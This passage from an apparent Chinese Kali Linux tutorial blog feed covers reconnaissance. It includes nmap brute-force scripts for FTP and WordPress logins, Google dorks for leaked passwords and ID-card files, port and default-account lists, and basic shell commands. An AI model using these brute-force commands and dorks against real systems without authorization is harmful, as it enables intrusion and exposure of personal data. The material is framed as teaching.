&lt;目标&gt;</p><p>检测目标是否存在空口令或者密码为Root</p></blockquote><p><strong>FTP 服务认证</strong></p><blockquote><p>脚本名称：ftp-brute</p><p>使用方法：nmap –script ftp-brute -p 21 &lt;目标&gt;</p><p>爆破目标是否存在弱口令</p><p>使用字典：nmap –script ftp-burute –script-args user=user.txt,passdword=passdword.txt &lt;目标&gt;</p></blockquote><p><strong>wordpress认证</strong></p><blockquote><p>脚本名称：http-wordpress-brute</p><p>使用方法：nmap –script http-wordpress-brute</p><p>使用字典：nmap –script http-wordpress-brute –script-args user=user.txt,passdword=passdword.txt &lt;目标&gt;</p></blockquote><p><strong>Nmap 指定脚本扫描</strong>：</p><blockquote><p>nmap –script=&lt;指定脚本名&gt; &lt;域名&gt;</p><p>nmap –script=smb-vuln-ms17-010 &lt;域名&gt;</p></blockquote><h3 id="Nmap报告输出"><a href="#Nmap报告输出" class="headerlink" title="Nmap报告输出"></a>Nmap报告输出</h3><h4 id="一-标准保存"><a href="#一-标准保存" class="headerlink" title="一 . 标准保存"></a>一 . 标准保存</h4><blockquote><p>nmap -oN &lt;文件&gt;.txt &lt;目标域名&gt;</p><p>标准保存会把输出结果保存到指定文件</p></blockquote><h4 id="二-保存为-XML-格式"><a href="#二-保存为-XML-格式" class="headerlink" title="二 . 保存为 XML 格式"></a>二 . 保存为 XML 格式</h4><blockquote><p>nmap -oX &lt;文件&gt;.xml &lt;目标域名&gt;</p><p>保存为 XML 格式需要用浏览器打开，查看结果</p></blockquote><p><strong>社工密码字典在线生成</strong>：<a href="www.coolrano.com/caimima/">字典链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
          <category> 网安知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux 搜索引擎 &amp; Google 语法</title>
      <link href="/2021/09/18/kali-LinuxICSearchEngine_Google/"/>
      <url>/2021/09/18/kali-LinuxICSearchEngine_Google/</url>
      
        <content type="html"><![CDATA[<h2 id="Kali-Linux-信息收集第一章-搜索引擎-amp-Google-语法"><a href="#Kali-Linux-信息收集第一章-搜索引擎-amp-Google-语法" class="headerlink" title="Kali Linux 信息收集第一章 搜索引擎 &amp; Google 语法"></a>Kali Linux 信息收集第一章 搜索引擎 &amp; Google 语法</h2><blockquote><p><strong><code>注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规</code></strong></p></blockquote><p><code>Lali Linux 系列第四篇信息收集第一章 搜索引擎 &amp; Google 语法</code></p><blockquote><p>从零开始的信息收集 | <strong>渗透测试的本质就是信息收集也是信息收集的一个过程，以及在过程中我们会使用到的一些技术</strong></p></blockquote><h4 id="信息收集的作用"><a href="#信息收集的作用" class="headerlink" title="信息收集的作用"></a>信息收集的作用</h4><blockquote><p>信息零碎化，收集的工整性（扩大渗透思路）</p><p><strong>最了解你的人，往往都是你的对手。<code>知己知彼、百战不殆</code></strong></p></blockquote><h5 id="收集哪些信息"><a href="#收集哪些信息" class="headerlink" title="收集哪些信息"></a>收集哪些信息</h5><p><strong>针对 WEB 渗透测试我们需要一下信息</strong></p><blockquote><ul><li>网站的架构</li><li>前端</li><li>后端</li><li>关于网站的一切信息等</li></ul></blockquote><h5 id="信息收集的重要性"><a href="#信息收集的重要性" class="headerlink" title="信息收集的重要性"></a>信息收集的重要性</h5><blockquote><p>知己知彼，百战不殆</p><p>观察、无从下手</p><p>开门有锁 | 需要钥匙</p><p>买U盘的性价比</p><ul><li>亏 | 存在信息差</li><li>赚 | 信息充分利用（优惠价 | 有性价比）</li></ul><p>打错人 | 因为错误信息</p><p>不相关事件 | 蝴蝶效应（学会信息存库）</p></blockquote><h5 id="为什么要进行信息收集"><a href="#为什么要进行信息收集" class="headerlink" title="为什么要进行信息收集"></a>为什么要进行信息收集</h5><blockquote><p>获取信息</p><p>了解对方</p><p>掌握情况</p><p>寻找弱点</p><p>安全短板</p></blockquote><h5 id="信息收集的内容"><a href="#信息收集的内容" class="headerlink" title="信息收集的内容"></a>信息收集的内容</h5><blockquote><p>对于 Web 渗透测试而言，针对目标系统所相关的信息</p></blockquote><table><thead><tr><th><strong>框架</strong></th><th>开发人员</th><th>安全人员</th></tr></thead><tbody><tr><td>前端</td><td>HTML | CSS | JS ···</td><td>指纹识别 | GITHUB/源代码泄露 | 敏感文件及地址</td></tr><tr><td>后端</td><td>PHP | ASP .NET | 容器 | 数据库···</td><td>框架识别 | 容器识别</td></tr><tr><td>中间件</td><td>就是中间件</td><td>组件报错</td></tr><tr><td>系统</td><td>Windows Server | Linux | mac Server</td><td>端口 | 系统识别</td></tr><tr><td>网络架构</td><td>OSI 模型</td><td>域名 | Whois | CDN | C段</td></tr></tbody></table><hr><h4 id="传统搜索引擎"><a href="#传统搜索引擎" class="headerlink" title="传统搜索引擎"></a>传统搜索引擎</h4><blockquote><p>主流搜索引擎分为：百度、Google、360、必应。他们的区别在于收录的结果多少不同。</p></blockquote><h5 id="传统搜索引擎作用"><a href="#传统搜索引擎作用" class="headerlink" title="传统搜索引擎作用"></a>传统搜索引擎作用</h5><blockquote><p>传统的搜索引擎能够有效的抓取对方网站页面内容信息</p><p>传统搜索引擎针对网页内容以及网页标题等相关信息进行抓取，提供给我们进行查阅</p></blockquote><p><strong>可能包含数据</strong></p><blockquote><ul><li>公司动态</li><li>组织文档</li><li>用户名 | 密码</li><li>测试文件</li><li>历史文件</li></ul></blockquote><hr><h4 id="Google-hack-语法"><a href="#Google-hack-语法" class="headerlink" title="Google hack 语法"></a>Google hack 语法</h4><blockquote><p>常见的 Google 语法，帮助我们快速缩小目标搜索范围</p></blockquote><p><strong>语法介绍</strong>：</p><blockquote><p>site：搜索范围限制在某个网站或顶级域名中</p><p>inurl：当我们用 inurl 进行查询的时候，Google 会返回那些在 URL（网址）里面包含了我们查询关键字的网页</p><p>intext：当我们用 intext 进行查询的时候，Google 会返回那些在文本正文里包含了我们查询关键字的网页</p><p>intitle：当我们用 intitle 进行查询的时候，Google 会返回那些在网页标题为查询结果</p><p>···</p></blockquote><p><strong>Google 语法例子</strong></p><blockquote><p>intitle : “netbotz app I i ance” “ok”   — 搜索标题</p><p>inurl : /admin/login.php   — 搜索地址</p><p>inurl : qq.txt  — 搜索文件 </p><p>filetype : xls “username | password” — 搜索文件类型</p><p>intext : password “Login Info” filetyoe : txt — 搜索文件</p><p>filetype:xls”身份证” — 搜索文件类型</p></blockquote><p><strong>扩展思路</strong>：<a href="https://www.exploit-db.com/google-hacking-database">扩展</a>（Google 白帽漏洞数据库）</p><p><strong>Google 镜像</strong></p><blockquote><p><a href="https://www.ggjxz.top/">https://www.ggjxz.top/</a></p><p><a href="https://gg456.top/">https://gg456.top/</a></p><p><a href="https://tools.bugscaner.com/google/">https://tools.bugscaner.com/google/</a></p></blockquote><hr><h4 id="网络空间引擎"><a href="#网络空间引擎" class="headerlink" title="网络空间引擎"></a>网络空间引擎</h4><blockquote><p>基于物联网搜索，搜索联网的网络设备（如打印机、摄像头、智能家居）</p><p>扫描在线的暴露的网络设备：路由器、主机、智能电视、联网设备</p></blockquote><p><strong>网络空间搜索引擎</strong></p><blockquote><ul><li>钟馗之眼：<a href="http://www.zoomeye.org/">http://www.zoomeye.org</a></li><li>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io</a></li><li>fofa：<a href="https://fofa.so/">https://fofa.so/</a></li><li>傻蛋：<a href="https://www.oshadan.com/">https://www.oshadan.com/</a></li><li>Dnsdb 搜索：<a href="https://www,dnsdb.io/zh-cn/">https://www,dnsdb.io/zh-cn/</a></li></ul></blockquote><hr><h4 id="精细化搜索"><a href="#精细化搜索" class="headerlink" title="精细化搜索"></a>精细化搜索</h4><blockquote><p>微信公众号：<a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></p><p>知乎相关：<a href="https://www.zhihu.com/search?q=">https://www.zhihu.com/search?q=</a></p><p>微博相关：<a href="http://s.weibo.com/?Refer=">http://s.weibo.com/?Refer=</a></p><p>购物：<a href="https://search.jd.com/Search?enc=utf-8&amp;keyword">https://search.jd.com/Search?enc=utf-8&amp;keyword</a></p><p>github：<a href="https://github.com/search?q=">https://github.com/search?q=</a></p><p>贴吧：<a href="http://tieba.baidu.com/f/search/res?qw=">http://tieba.baidu.com/f/search/res?qw=</a></p></blockquote><blockquote><p>例如：</p><p>site:tieba.baidu.com “qq号”</p><p>weixin.sougou.com  — 搜狗微信文章，文章有试用的账户密码等</p></blockquote><hr><h4 id="撰写信息收集报告"><a href="#撰写信息收集报告" class="headerlink" title="撰写信息收集报告"></a>撰写信息收集报告</h4><p><strong>整理信息的方式有很多种，我们的最终目标是整理我们收集到的信息进行分析</strong></p><blockquote><p><strong>一 . 信息收集-环境</strong></p><p>域名：</p><p>脚本语言：<br>数据库：</p><p>中间件：</p><p>服务器系统：</p><p>WAF：无</p><p>CMS 或 框架：</p><p>真实 IP：</p><p>开放的敏感端口：</p><p>历史解析 IP：</p><p>注册邮箱：</p><p>Whois：</p><p>安全措施（如：自定义404、伪静态处理、流量防护等）.. 404</p><p>子域名：（如：自定义404、伪静态处理、流量防护等）</p><p>旁站：</p><p>目录信息：</p><p>····</p><p><strong>二 . 信息收集 - 网络架构</strong></p><ol><li><p>搜索引擎收集目标信息（site + 找后台语法）</p><p><code>外围式信息收集，不经过目标。可避免各种环境因素干扰。应当首选。</code></p><p> 1.1 百度</p><p>​    结果：无可利用</p><p>  1.2 Google</p><p>​    结果：无可利用</p><p>  1.3 必应</p><p>​    结果：无可利用</p><p>  1.4 sougou</p><p>   结果：无可利用</p><p>  1.5 360 搜索</p><p>   结果：无可利用</p></li><li><p>目标爬行</p><p><code>爬行相对于暴力扫描来说动静小很多、且对于目标的收集效率高</code></p><p>注：可使用 Burp suite、Awvs</p><p>结果：</p></li><li><p>暴力猜解</p><p> 3.1 基于字典的扫描。</p><p><code>注：可疑目录继续进行子目标扫描..</code></p><p>结果：</p></li></ol><p><strong>三 . 弱点探测</strong></p><ol><li><p>平台漏扫（+蜘蛛 UA）</p><p>Robots.txt</p></li></ol></blockquote><blockquote><p>域名：xxx</p><p>子域名：xxx</p><p>​              xxx</p><p>脚本语言：xxx</p><p>···</p></blockquote><p><code>还可以通过表格,找到适合自己的信息整理方式。我个人喜欢表格</code></p><hr><p><strong>扩展</strong>：</p><blockquote><p>相应工具有相应的功能</p><ul><li>通过端口扫描搜索数据库信息、端口信息</li><li>域名可以查IP、查旁站、查后台</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
          <category> 网安知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux 渗透测试流程以及信息收集</title>
      <link href="/2021/09/16/Kali-LinuxPTPAIillustrate/"/>
      <url>/2021/09/16/Kali-LinuxPTPAIillustrate/</url>
      
        <content type="html"><![CDATA[<h2 id="Kali-Linux-渗透测试流程以及信息收集"><a href="#Kali-Linux-渗透测试流程以及信息收集" class="headerlink" title="Kali Linux 渗透测试流程以及信息收集"></a>Kali Linux 渗透测试流程以及信息收集</h2><blockquote><p><strong><code>注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规</code></strong></p></blockquote><p><code>Lali Linux 系列第四篇 开篇说明</code></p><blockquote><p><strong>一切从信息收集开始</strong></p></blockquote><h3 id="信息收集的作用"><a href="#信息收集的作用" class="headerlink" title="信息收集的作用"></a>信息收集的作用</h3><blockquote><p>为什么要进行信息收集？<br>答：当我们要对一个目标进行渗透测试的时候为了防止无从下手，我们首先要获取目标的信息，掌握详细的情况，了解目标的<code>弱点</code>和<code>安全短板</code>，知己知彼，才能百战不殆。<strong>在渗透测试时信息收集是我们的第一步，信息收集的全面性对于后期的渗透工作必为重要，甚至关联到能不能挖掘到漏洞</strong></p></blockquote><hr><h3 id="信息收集什么"><a href="#信息收集什么" class="headerlink" title="信息收集什么"></a>信息收集什么</h3><p><strong>信息收集举例小故事</strong>：</p><blockquote><p>哇！女神！！想去搭讪但是不敢！！！</p><p>她是谁？她是哪个班的？她微信是什么？</p><p>舔狗在寻找目标</p><hr><p>姓名、微信号：目标人物</p><p>班级：目标环境</p><p>爱干的事情、喜好：目标事件</p><hr><p>目标人物：电话、邮箱、密码、whois等</p><p>目标环境：域名、脚本语言、数据库、中间件、框架、cms、开放端口等</p><p>目标事件：历史漏洞、使用手册、使用说明、通告、公众号等</p><p><strong><code>总之就是收集一切对我们有帮助的信息</code></strong></p></blockquote><hr><h4 id="常见的端口服务说明"><a href="#常见的端口服务说明" class="headerlink" title="常见的端口服务说明"></a>常见的端口服务说明</h4><ul><li><strong>数据库</strong>：关系型数据库、NOSQL数据库</li></ul><h5 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h5><blockquote><p>Oracle 数据库 端口：1521</p><p>pointbase 端口：9092</p><p>DB2 端口：5000</p><p>Oracle XDB （XML 数据库）端口：8080</p><p>mySQL 端口：3306  管理员账户：root</p><p>mssSQL 端口：1433 | 1434 管理员账户：sa</p></blockquote><h5 id="N0SQL-数据库"><a href="#N0SQL-数据库" class="headerlink" title="N0SQL 数据库"></a>N0SQL 数据库</h5><blockquote><p>MongoDB 端口：27017</p><p>Redis 端口：6379</p><p>memcached 端口：11211</p></blockquote><p><code>端口是可以修改的</code></p><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><blockquote><p>端口：21    FTP（文件传输）协议</p><p>端口：23    Telnet（远程登录）协议</p><p>端口：80 / 8080 / 3128 / 8081 / 9080    HTTP协议代理服务器常用端口号</p><p>端口：110    POP3 Post Office Protocol（E-mail）</p><p>端口：22      SSH（安全登录）、SCP（文件传输）、端口重定向</p><p>端口：69      TFTP（Trivial File Transfer Protocol）</p><p>端口：443    HTTPS（securely transferring web pages）</p><p>端口：3389   远程桌面协议（ROP）</p><p>端口：8080    Oracle XDB FTP 服务</p><p>端口：8080    JBOSS</p><p>端口：8080    TOMCAT</p><p>端口：7001    WebLogic</p><p>端口：9090    Webshpere 管理工具</p><p>端口：9080    Webshpere应用程序</p></blockquote><hr><h4 id="攻击路线"><a href="#攻击路线" class="headerlink" title="攻击路线"></a>攻击路线</h4><h5 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h5><h5 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h5><h5 id="Web应用服务"><a href="#Web应用服务" class="headerlink" title="Web应用服务"></a>Web应用服务</h5><h5 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h5><h5 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h5><h5 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h5><h5 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h5><hr><h3 id="通过信息收集可以做什么"><a href="#通过信息收集可以做什么" class="headerlink" title="通过信息收集可以做什么"></a>通过信息收集可以做什么</h3><blockquote><p><strong>渗透测试的灵魂就是信息收集</strong></p><ul><li>CMS 可能存在通杀漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击</li><li>这些危险端口开放了我们就可以尝试入侵。例如 <code>445 | 3306 | 22 | 1433 | 6379</code>可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站</li></ul></blockquote><h3 id="信息收集报告编写"><a href="#信息收集报告编写" class="headerlink" title="信息收集报告编写"></a>信息收集报告编写</h3><blockquote><p><strong>编写信息收集报告就是记录我们在信息收集时收集到的信息</strong></p><p>目标人物：电话、邮箱、密码、whois等</p><p>目标环境：域名、脚本语言、数据库、中间件、框架、CMS、开放端口等</p><p>目标事件：历史漏洞、使用手册、使用说明、通知、公众号、手机APP</p><p><code>具体文档可在网上查询</code></p></blockquote><hr><p><strong>目标人物</strong></p><blockquote><p>whois</p><p>网站管理员</p><p>邮箱 | 反查</p><p>电话</p><p>···</p></blockquote><p><strong>目标事件</strong></p><blockquote><p>公众号</p><p>小程序</p><p>手机APP</p><p>通知</p><p>使用说明</p><p>使用手册</p><p>历史漏洞</p><p>···</p></blockquote><p><strong>域名</strong></p><blockquote><p>子域名</p><p>子域名的子域名</p><p>证书</p><p>···</p></blockquote><p><strong>脚本语言</strong></p><blockquote><p>PHP</p><p>JSP</p><p>ASP</p><p>ASPX</p><p>···</p></blockquote><p><strong>数据库</strong></p><blockquote><p>MySQL</p><p>MsSQL</p><p>Oracle</p><p>···</p></blockquote><p><strong>目录爬行</strong></p><blockquote><p>目录遍历</p><p>目录文件</p><p>···</p></blockquote><p><strong>目录浏览</strong>（相当于爬虫）</p><blockquote><p>robots.txt    — 爬虫协议，可能会泄露信息给我们</p><p>目录地址 | 登陆</p><p>框架所开发的路由</p><p>···</p></blockquote><p><strong>源码泄露</strong></p><blockquote><p>.svn</p><p>.git</p><p>备份文件</p><p>···</p></blockquote><p><strong>中间件</strong></p><blockquote><p>IIS</p><p>apache</p><p>nginx</p><p>···</p></blockquote><p><strong>服务器系统</strong></p><blockquote><p>windows</p><p>linux</p><p>···</p></blockquote><p><strong>DNS解析</strong></p><blockquote><p>作为域名和IP地址相互映射的一个分布式数据库，DNS协议运行在UDP协议之上，使用端口号<code>53</code>，在 RFC 文档中 RFC 2181 对 DNS 有规范说明，RTC 2136 对 DNS 的动态更新进行说明 RFC 2308 对 DNS 查询的反向缓存进行说明（可以在漏洞人生查看信息）</p></blockquote><blockquote><p>阿里云</p><p>西部数码</p><p>传送域漏洞</p><p>···</p></blockquote><p><strong>CMS</strong></p><blockquote><p>dedecms</p><p>wordperss</p></blockquote><p><strong>框架</strong></p><blockquote><p>thinkphp</p><p>Struts2</p><p>···</p></blockquote><p><strong>开放端口</strong></p><blockquote><p>HTTP：80</p><p>FTP：21</p><p>MySQL：3306</p><p>···</p></blockquote><p><strong>目标IP</strong></p><blockquote><p>阿里云</p><p>历史解析</p><p>超级ping</p><p>···</p></blockquote><p><strong>C 段地址</strong></p><blockquote><p>IP</p><p>域名</p><p>···</p></blockquote><p><strong>IDC</strong></p><blockquote><p>阿里云</p><p>某某互联</p><p>···</p></blockquote><p><strong>WAF</strong></p><blockquote><p>云盾</p><p>云锁</p><p>安全狗</p><p>安全卫士</p><p>···</p></blockquote><p><strong>图床</strong></p><blockquote><p>七牛云</p><p>阿里云</p><p>···</p></blockquote><p><strong>安全措施</strong></p><blockquote><p>自定义404、伪静态处理、流量防护等</p><p><strong>CDN</strong></p><ul><li>百度云加速</li><li>加速乐</li></ul><p>···</p></blockquote><p><strong>第三方资源引入</strong></p><blockquote><p>SDK</p><p>JS</p><p>···</p></blockquote><p><strong>旁站</strong></p><blockquote><p>上面过程再来一遍</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
          <category> 网安知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali-Linux 软件管理</title>
      <link href="/2021/09/16/kali-LinuxSoftwareManagement/"/>
      <url>/2021/09/16/kali-LinuxSoftwareManagement/</url>
      
        <content type="html"><![CDATA[<h2 id="软件管理"><a href="#软件管理" class="headerlink" title="软件管理"></a>软件管理</h2><p><code>Lali Linux 系列第三篇</code></p><h3 id="Dpkg"><a href="#Dpkg" class="headerlink" title="Dpkg"></a>Dpkg</h3><blockquote><p>dpkg 是一个 Debian 的一个命令行工具，它可以用来安装、删除、构建和管理 Debian 的软件包</p></blockquote><p><strong>安装软件</strong></p><blockquote><p>dpkg -i xxx.deb</p></blockquote><p><code>如果安装出错（缺少依赖），我们需要更新Kali的源</code></p><blockquote><p>apt -get upgrade</p></blockquote><blockquote><p>apt –fix-broken install</p></blockquote><p><strong>卸载软件</strong></p><blockquote><p>dpkg -r xxx.deb    — 删除软件包</p><p>dpkg -r –purge xxx.deb    — 连同配置文件一起删除</p></blockquote><h3 id="Gdebi"><a href="#Gdebi" class="headerlink" title="Gdebi"></a>Gdebi</h3><blockquote><p>gdebi 是一个轻量级的 deb 安装工具，它能代替臃肿的 ubuntu软件中心安装 deb</p></blockquote><p><strong>安装gdebi</strong></p><blockquote><p>sudo apt-get update  — 更新系统</p><p>sudo apt-get install gdebi — 安装软件</p></blockquote><p><strong>安装软件</strong></p><blockquote><p>sudo gdebi xxx.deb 选择Y即可 — 这个是命令行，当然还包含图形化安装</p></blockquote><hr><h3 id="压缩命令"><a href="#压缩命令" class="headerlink" title="压缩命令"></a>压缩命令</h3><p><strong>Linux 下常用的压缩文件格式</strong></p><blockquote><p>.zip</p><p>.gz</p><p>.bz2</p><p>.tar.gz</p><p>.tar.bz2</p></blockquote><h3 id="tar-命令"><a href="#tar-命令" class="headerlink" title="tar 命令"></a>tar 命令</h3><p><strong>打包命令</strong></p><blockquote><p>tar -czvf &lt;打包后的文件名&gt; &lt;源文件名&gt;</p></blockquote><p><strong>解包命令</strong></p><blockquote><p>tar -xzvf &lt;指定解包文件&gt;</p></blockquote><p><strong>tar 打包时的选项</strong></p><blockquote><p>-c    — 打包</p><p>-z    — 打包同时进行压缩</p><p>-v    — 打包时显示出详细信息（可选）</p><p>-f    — 指定打包文件名</p></blockquote><p><strong>tar 解包时的选项</strong></p><blockquote><p>-x    — 解包</p><p>-z    — 解包时同时解压</p><p>-v    — 解包时显示出详细信息（可选）</p><p>-f    — 指定解包的文件名</p></blockquote><p><strong>参考</strong>：<a href="https://blog.csdn.net.weixin_38111957/article/details/80210191">参考文件</a></p><hr><h3 id="搜索命令"><a href="#搜索命令" class="headerlink" title="搜索命令"></a>搜索命令</h3><h4 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h4><blockquote><p>find 是通过搜索目录，并输出一个内容</p></blockquote><p><strong>指定目录查找并输出</strong></p><blockquote><p>find ./kali/ -print</p></blockquote><p><strong>指定目录以 Shell 脚本运行并输出</strong></p><blockquote><p>find ./kali/ -exec ls {} ;</p><p>find ./kali/ -exec ls -l {} ;    — -l查看权限信息</p></blockquote><p><strong>参考</strong>：<a href="https://blog.csdn.net/WX_East/article/details/68530883">参考文件</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali-Linux 基础</title>
      <link href="/2021/09/15/kaliLinux_jcjs/"/>
      <url>/2021/09/15/kaliLinux_jcjs/</url>
      
        <content type="html"><![CDATA[<h2 id="kali-Linux基础"><a href="#kali-Linux基础" class="headerlink" title="kali-Linux基础"></a>kali-Linux基础</h2><p><code>Lali Linux 系列第一篇</code></p><p><strong>在线命令查找：<a href="http://linux.51yip.com/">Linux命令参考</a></strong></p><p><strong>实验没用环境情况下可以在网上搜索在线PHP工具来测试</strong><a href="https://tool.lu/coderunner/">在线代码工具</a></p><h3 id="Kali-Linux代码介绍"><a href="#Kali-Linux代码介绍" class="headerlink" title="Kali-Linux代码介绍"></a>Kali-Linux代码介绍</h3><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">su root --- 切换到Root</span><br><span class="line">sudo su --- 注册Root</span><br><span class="line">Passwd root --- 输入新密码并重新输入改密码，注册Root</span><br><span class="line">:w !sudo tee %  --- 管理员身份强制保存只读文件</span><br><span class="line">lastb --- 查看目前与过去登入系统的用户相关信息</span><br><span class="line">users --- 查看在线用户</span><br><span class="line">chmod --- 权限管理</span><br><span class="line">cat /etc/passwd --- 查看用户信息</span><br><span class="line">cat /etc/group --- 查看用户组</span><br><span class="line">id &lt;用户名&gt; --- 查看指定用户信息</span><br><span class="line">id &lt;组名&gt; --- 查看指定用户组信息</span><br><span class="line">useradd -m &lt;用户名&gt;  --- 自动在home文件夹下创建&lt;用户&gt;目录 - 添加用户</span><br><span class="line">useradd -g &lt;组名&gt; &lt;用户名&gt; --- 指定添加在某个组里</span><br><span class="line">passwod &lt;用户名&gt;  --- 修改用户的新密码</span><br><span class="line">userdel -r &lt;用户名&gt;  --- 删除目录以及用户</span><br><span class="line">groups &lt;用户名&gt;      --- 查看用户组归属</span><br><span class="line">usermod -g &lt;组名&gt; &lt;用户名&gt; --- 添加组 直接添加组用用户从原来组</span><br><span class="line">usermod -a-G &lt;组名&gt; &lt;用户名&gt; --- 追加到新的组</span><br><span class="line">groupdel &lt;组名&gt; 删除组</span><br><span class="line"></span><br><span class="line">cat /etc/shells --- 查看它支持哪些Shells</span><br><span class="line">echo $SHELLS --- 查看使用的哪个Shells，$是变量的意思|区分大小写</span><br><span class="line">service ssh status --- 查看SSH服务是否开启（开机必查）</span><br><span class="line">/etc/init<span class="variable">.d</span>/ssh status --- 查看SSH服务是否开启，方式二</span><br><span class="line">service ssh start --- 开启Shells服务，（必须开启）</span><br><span class="line">systemctl status ssh --- 查看运行状态</span><br><span class="line"></span><br><span class="line">ifconfig --- 查询IP地址，远程连接等需要IP使用（不建议使用固定IP地址）</span><br><span class="line">ifconfig eth0 <span class="number">192</span><span class="variable">.168</span><span class="variable">.1</span><span class="variable">.65</span> --- 给eth0配置固定的IP地址，当然可以固定网关、子网掩码。具体看命令参考的介绍</span><br><span class="line">service apache2 start --- 开启阿帕奇服务（自动开启WEB服务，在eth0端口查看）</span><br><span class="line"></span><br><span class="line">clear --- 刷新屏幕</span><br><span class="line">reset --- 完全刷新终端屏幕</span><br><span class="line">ls --- 查看目录下文件和dir命令一样</span><br><span class="line">ls -a --- 查看隐藏文件 -A取消隐藏文件</span><br><span class="line">ls -l --- 查看文件权限划分（查看文件权限）</span><br><span class="line">ls -lt --- 时间排序查看文件</span><br><span class="line">dir --- 查看目录下文件和ls命令一样</span><br><span class="line">&lt;指令&gt; -help --- 查看指令的帮助命令</span><br><span class="line">pwd --- 查看当前目录</span><br><span class="line">cd --- 切换目录，cd ~ 快速进入root目录|cd / 进入根目录</span><br><span class="line">cp &lt;文件名<span class="number">1</span>&gt;<span class="variable">.txt</span> &lt;目录路径&gt; --- 将文件复制粘贴在一个目录里</span><br><span class="line">mv &lt;文件名&gt; &lt;重命名&gt; --- 文件改名</span><br><span class="line">mv &lt;文件名&gt; &lt;目标路径&gt; --- 移动文件</span><br><span class="line">file &lt;文件名&gt; --- 查看文件的类型信息</span><br><span class="line">tar -czvf &lt;文件&gt;<span class="variable">.tar</span> &lt;文件&gt; ---- 打包压缩文件</span><br><span class="line">tar zxvf &lt;文件&gt;<span class="variable">.tar</span> --- 解压文件</span><br><span class="line">zip --- 压缩zip文件（具体请看命令参考的详细信息）</span><br><span class="line">unzip &lt;文件&gt;<span class="variable">.zip</span> --- 解压zip文件（具体请看命令参考的详细信息）</span><br><span class="line">wget --- 下载命令</span><br><span class="line">git clone &lt;地址&gt; --- 下载git项目，clone克隆的意思</span><br><span class="line">wget &lt;图片地址&gt; --- 下载图片</span><br><span class="line">apt-get install &lt;软件名称&gt; --- 下载安装软件、文件</span><br><span class="line">dpkg -i &lt;安装包名称&gt; --- 安装软件（如果报错请下载依赖：debian或ubuntu软件管理包）</span><br><span class="line">sudo apt-get update --- 更新系统</span><br><span class="line">dpkg -r &lt;安装包名称&gt; --- 删除软件包</span><br><span class="line">dpkg -r --purge &lt;安装包名称&gt; --- 连同配置文件一起删除（卸载）</span><br><span class="line"></span><br><span class="line">rm &lt;文件&gt; --- 删除文件</span><br><span class="line">rm -rf --- 强制删除文件目录等 f是强制删除 r是递归删除</span><br><span class="line">mkdir &lt;文件夹名称&gt; --- 创建一个文件夹</span><br><span class="line">touch &lt;文件名称&gt;<span class="variable">.txt</span> --- 创建文件</span><br><span class="line">vim &lt;文件名&gt;<span class="variable">.txt</span> --- 进入文件命令模式，具体参考VM编辑器的使用</span><br><span class="line">cat &lt;文件名&gt;<span class="variable">.txt</span> --- 查看文件内容（少的）</span><br><span class="line">more &lt;文件名&gt;<span class="variable">.txt</span> --- 查看文件内容（多的）</span><br><span class="line">stat &lt;文件名&gt;<span class="variable">.txt</span> --- 查看文件存储、时间信息</span><br><span class="line">wc &lt;文件名&gt;<span class="variable">.txt</span> --- 查看文件的行数、字数、字节数</span><br><span class="line">man nmap --- 帮助我们查看Nmap软件的帮助文件</span><br><span class="line">find &lt;地址文件etc/passwd&gt; --- 根据要求查找文件也可以查找文件内容（具体请看命令参考的详细信息）</span><br><span class="line">man nmap &gt;&gt; &lt;文件名&gt;<span class="variable">.text</span> --- 将Nmap帮助文件内容输入在文件内</span><br><span class="line">touch -c -t <span class="number">09112003</span> &lt;文件名&gt;<span class="variable">.text</span> --- 将文件时间改为，<span class="number">9</span>月<span class="number">11</span>日<span class="number">20</span>点<span class="number">03</span>分 -c 不创建任何文件</span><br><span class="line">touch -d <span class="string">&quot;2 days ago&quot;</span> &lt;文件名&gt;<span class="variable">.text</span> --- 将文件时间修改为<span class="number">2</span>天以前根据系统时间改（具体请看命令参考的详细信息）</span><br><span class="line"></span><br><span class="line">apt update -y &amp;&amp; apt install xfonts-intl-chinese ttf-wqy-microhei --- 安装字体</span><br><span class="line">echo LANG=<span class="string">&quot;zh_CN.UTF-8&quot;</span> &gt; /etc/<span class="keyword">default</span>/locale --- 官方虚拟机包运行可设置系统语言为中文</span><br><span class="line">dpkg-reconfigure locales --- 更换语言</span><br><span 